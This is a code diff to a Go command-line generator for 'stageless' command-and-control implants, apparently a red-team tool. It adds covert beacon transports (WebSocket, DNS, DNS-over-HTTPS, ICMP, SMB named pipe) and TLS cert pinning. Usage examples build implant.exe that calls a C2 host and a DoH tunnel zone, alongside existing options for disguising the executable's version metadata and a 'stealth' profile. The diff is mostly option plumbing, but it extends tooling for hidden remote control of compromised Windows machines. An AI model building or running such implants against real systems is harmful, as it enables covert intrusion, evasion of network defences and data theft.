@@ -149,6 +149,20 @@ var stagelessCmd = &cobra.Command{
     --c2 https://c2.example.com \
     --key MyAESKey \
     --profile profiles/stealth.yaml \
+    --output bin/implant.exe
+
+  # WebSocket transport (server must be started with --ws):
+  taburtuai-generate stageless --c2 https://c2.example.com --key K \
+    --transport ws --output bin/implant.exe
+
+  # DNS-over-HTTPS transport (requires authoritative DNS zone for --doh-domain):
+  taburtuai-generate stageless --c2 https://c2.example.com --key K \
+    --transport doh --doh-domain tunnel.example.com --doh-provider cloudflare \
+    --output bin/implant.exe
+
+  # SMB pipe transport (requires cmd/listener/smb_relay running on --smb-relay host):
+  taburtuai-generate stageless --c2 https://c2.example.com --key K \
+    --transport smb --smb-relay 192.168.1.5 --smb-pipe svcctl \
     --output bin/implant.exe`,
 	RunE: runStageless,
 }
@@ -183,6 +197,16 @@ stagelessCmd.Flags().Int("interval", 30, "Beacon interval (seconds)")
 	stagelessCmd.Flags().String("masq-internal", "", "PE version-resource InternalName (default: masq-orig minus .exe)")
 	stagelessCmd.Flags().String("masq-ver", "", "PE version string, e.g. 10.0.19041.1")
 	stagelessCmd.Flags().Bool("insecure-tls", false, "Skip TLS cert verification in agent (for self-signed C2 certs)")
+	stagelessCmd.Flags().String("cert-pin", "", "Pin server TLS leaf cert by SHA-256 hex fingerprint (HTTPS/WSS only)")
+	// ── Transport selection (Go implant only) ─────────────────────────────────
+	stagelessCmd.Flags().String("transport", "http", "Agent transport: http|https|ws|doh|dns|icmp|smb")
+	stagelessCmd.Flags().String("ws-url", "", "WebSocket URL (default: derived from --c2 with ws/wss scheme)")
+	stagelessCmd.Flags().String("dns-domain", "", "DNS transport: C2-controlled zone (e.g. tunnel.example.com)")
+	stagelessCmd.Flags().String("dns-server", "", "DNS transport: authoritative DNS server host:port (default: --c2 host + :5353)")
+	stagelessCmd.Flags().String("doh-domain", "", "DoH transport: C2-controlled zone")
+	stagelessCmd.Flags().String("doh-provider", "cloudflare", "DoH resolver: cloudflare|google")
+	stagelessCmd.Flags().String("smb-relay", "", "SMB transport: relay host or IP")
+	stagelessCmd.Flags().String("smb-pipe", "svcctl", "SMB transport: pipe name")
 	_ = stagelessCmd.MarkFlagRequired("c2")
 	_ = stagelessCmd.MarkFlagRequired("key")
 }
@@ -216,6 +240,37 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 	masqInternal, _ := cmd.Flags().GetString("masq-internal")
 	masqVer, _ := cmd.Flags().GetString("masq-ver")
 	insecureTLS, _ := cmd.Flags().GetBool("insecure-tls")
+	certPin, _ := cmd.Flags().GetString("cert-pin")
+	// Transport flags (Go implant only — C implant ignores these for now)
+	transport, _ := cmd.Flags().GetString("transport")
+	wsURL, _ := cmd.Flags().GetString("ws-url")
+	dnsDomain, _ := cmd.Flags().GetString("dns-domain")
+	dnsServer, _ := cmd.Flags().GetString("dns-server")
+	dohDomain, _ := cmd.Flags().GetString("doh-domain")
+	dohProvider, _ := cmd.Flags().GetString("doh-provider")
+	smbRelay, _ := cmd.Flags().GetString("smb-relay")
+	smbPipe, _ := cmd.Flags().GetString("smb-pipe")
+
+	// Per-transport required-flag validation
+	switch transport {
+	case "ws":
+		// wsURL optional — derived from --c2 if empty
+	case "dns":
+		if dnsDomain == "" {
+			return fmt.Errorf("--dns-domain is required when --transport=dns")
+		}
+	case "doh":
+		if dohDomain == "" {
+			return fmt.Errorf("--doh-domain is required when --transport=doh")
+		}
+	case "smb":
+		if smbRelay == "" {
+			return fmt.Errorf("--smb-relay is required when --transport=smb")
+		}
+	case "icmp":
+		fmt.Fprintln(os.Stderr, "[!] WARNING: ICMP server-side listener not yet implemented (ROADMAP 11.4).")
+		fmt.Fprintln(os.Stderr, "    Agent will beacon via ICMP echo but receive no replies until cmd/listener/icmp_listener.go ships.")
+	}
 
 	var profile *OpsecProfile
 	if profilePath != "" {
@@ -372,6 +427,15 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 		Compress:     compress,
 		Profile:      profile,
 		InsecureTLS:  insecureTLS,
+		CertPin:      certPin,
+		Transport:    transport,
+		WSServerURL:  wsURL,
+		DNSDomain:    dnsDomain,
+		DNSServer:    dnsServer,
+		DOHDomain:    dohDomain,
+		DOHProvider:  dohProvider,
+		SMBRelay:     smbRelay,
+		SMBPipe:      smbPipe,
 	})
 	if err != nil {
 		return err
